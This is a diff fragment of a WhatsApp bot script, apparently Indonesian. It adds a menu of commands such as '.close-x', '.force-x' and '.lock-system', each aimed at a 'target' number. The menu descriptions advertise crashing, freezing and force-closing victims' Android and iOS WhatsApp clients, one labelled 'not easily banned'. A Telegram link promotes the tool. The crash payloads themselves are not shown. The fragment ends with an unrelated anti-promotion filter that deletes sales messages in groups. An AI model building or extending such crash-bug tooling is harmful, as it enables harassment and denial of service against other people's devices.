+                  title: "≽️⌁⏐︎⏐︎𝐄̌̀𝐧⃣̢𝐄𝐭̢̌𝐄𝐜𝐮̢𝐓𝐄⃫𝐈̌𝐀̢𝐮𝐋𝐓⦽🐉",
+                  rows: [{
+                    title: "⦉「 𝐓̢𝐫⃜𝐀𝐬⃰𝐡𝐗𝐞̀𝐂⃨𝐥𝐢𝐞⃛𝐧𝐭̀𝐂𝐫⃨𝐀𝐬⃰𝐡𝐇𝐢  」",
+                    description: "└ InVisible Crashing Freeze Andro Bvg ( New )",
+                    id: ".close-x " + target
+                  }, {
+                    title: "⦉「 𝐒̢𝐢̀𝐁⃨𝐓𝐫⃜𝐀⃰𝐬̀𝐇𝐗𝐞́𝐧𝐞Ͱ  」",
+                    description: "└ InVisible Crashing X Delay X Freeze Ui Andro ( New )",
+                    id: ".vxs " + target
+                  }, {
+                    title: "⦉「 𝐓̢𝐫̊𝐀𝐬⃬𝐡𝐗𝐢⃥𝐗𝐇𝐞𝐥̢  」",
+                    description: "└ Blank Visible Bvg Combo In Crahed Whatsapp",
+                    id: ".xmsg " + target
+                  }, {
+                    title: "⦉「 𝐓̢𝐫̊𝐀𝐬̀𝐇𝐗𝐢⃛𝐈̺𝐄̦𝐥̦𝐀𝐲̢͖⃗  」",
+                    description: "└ Forclose Ios Bvg",
+                    id: ".lock-system " + target
+                  }, {
+                    title: "⦉「 𝐈⃨𝐧⃰𝐈𝐧𝐕𝐢𝐬𝐢𝐛𝐥𝐞𝐗⃨𝐨⃨  」",
+                    description: "└ Visible Delay Visible Image",
+                    id: ".invisible-x " + target
+                  }, {
+                    title: "⦉「 𝐅⃰𝐫⃯̊𝐓𝐜⃰𝐬̀𝐇⃜𝐌𝐋̢  」",
+                    description: "└ Crash Whatsapp Not easly Banned ( New )",
+                    id: ".force-x " + target
+                  }, {
+                    title: "⦉「 𝐕̢𝐢𝐬𝐢𝐛𝐥𝐞𝐗⃑𝐨𝐁⃧𝐀𝐠⃫̢̙⃨⃛  」",
+                    description: "└ Crash Whatsapp Visible IMG easly Banned",
+                    id: ".void-x " + target
+                  }, {
+                    title: "⦉「 𝐈̵̴𝐜⃰𝐄⃨̀𝐋⃧𝐗⃑𝐀𝐠⃫̢̙⃨」",
+                    description: "└ Freeze Screen Bvg IOS",
+                    id: ".lava-blaze " + target
+                  }, {
+                    title: "⦉「 𝐈̵̴𝐜⃰𝐄⃨̀𝐋⃧𝐗⃑𝐀𝐠𝐗𝐢⃥𝐄𝐥̦𝐀𝐲⃫̢̢͖̙⃨⃗」",
+                    description: "└ Delay Freeze Screen Bvg ( New )",
+                    id: ".xtrash-kill " + target
+                  }]
+                }],
+                has_multiple_buttons: true
+              })
+            }],
+            messageParamsJson: JSON.stringify({
+              limited_time_offer: {
+                text: "≽️⏟⌁⏐︎⏐︎𝐄𝐥𝐦𝐚𝐭𝐚𝐝𝐨𝐫⦽🐉",
+                url: "https://t.me/AsepXxnx",
+                copy_code: "./AsepXyzXTrinity.json",
+                expiration_time: Date.now() * 999
+              }
+            })
+          }
+        }]
+      }
+    }
+  }, { quoted: m })
+}
+break;
+
 
 
 
@@ -28208,7 +32628,16 @@ if (m.isGroup && badWords.some(word => msgText.includes(word)) && !m.fromMe) {
         // Handler list selection
 
         // Taroh paling atas file kalau belum ada
+if (m.isGroup && global.db.data.chats[m.chat]?.antiPromosi) {
+    const textFix = (m.text || '').toLowerCase()
+    const promo = ['panel','akun','join','diskon','promo','minat','pm','testi','list','ready','nominal','sell','jual','peem','sewa','open','pv','dm','murmer','wtb','wts','forsell','harga','info','need']
 
+    if (promo.some(k => new RegExp(`\\b${k}\\b`, 'i').test(textFix)) &&!isCreator &&!isAdmin) {
+        await Asepp.sendMessage(m.chat, { delete: m.key }) // Asepp pake conn bukan danz
+        await payreply(`*ANTI PROMOSI*\n\nWah @${m.sender.split('@')[0]}, dilarang jualan/promosi di sini tanpa izin admin ya!\n> PayReply Bot`)
+        return
+    }
+}
 
 
 // =============== [ END AFK AUTO DETECT ] ===============
